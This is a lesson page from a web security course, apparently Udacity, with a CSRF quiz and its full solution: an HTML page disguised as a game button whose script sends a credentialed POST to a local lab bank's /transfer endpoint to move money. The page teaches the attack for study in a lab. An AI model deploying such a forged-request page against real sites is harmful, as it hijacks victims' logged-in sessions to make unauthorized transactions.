# Lesson 5.10 Quiz: CSRF Quiz

1. Sign in to the bank
    - super secret password
2. Create a website in the evil folder that forces the visitor to send a POST request
    - POST request must be sent to the bank's /transfer URL
    - data must be "recipient-Umbrella+Corp&amount=666"
    - include the credentials in the POST request

[Supporting Materials](http://video.udacity-data.com.s3.amazonaws.com/topher/2016/June/575717e4_l5-csrf-binary/l5-csrf-binary.zip)

### Solution:
```
<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>CSRF</title>
</head>
<body>
	
	<button>Click here to play a fun game</button>

	<script>
		var button = document.querySelector('button');

		button.addEventListener('click', function() {
			var body = 'recipient=Umbrella+Corp&amount=666';

			fetch('http://bank.127.0.0.1.xip.io:8080/transfer', {
				method: 'POST',
				headers: {
					'Content-Length': body.length,
					'Content-Type': 'application/x-www-form-urlencoded'
				},
				credentials: 'include',
				body: body,
			});

			button.textContent = 'You just lost the game...';
		});
	</script>

</body>
</html>

```

- - -
Next up: [Security Exploit - XSS](ND024_Part4_Lesson05_11.md) or return to [Table Of Contents](./ND024_TableOfContents.md)
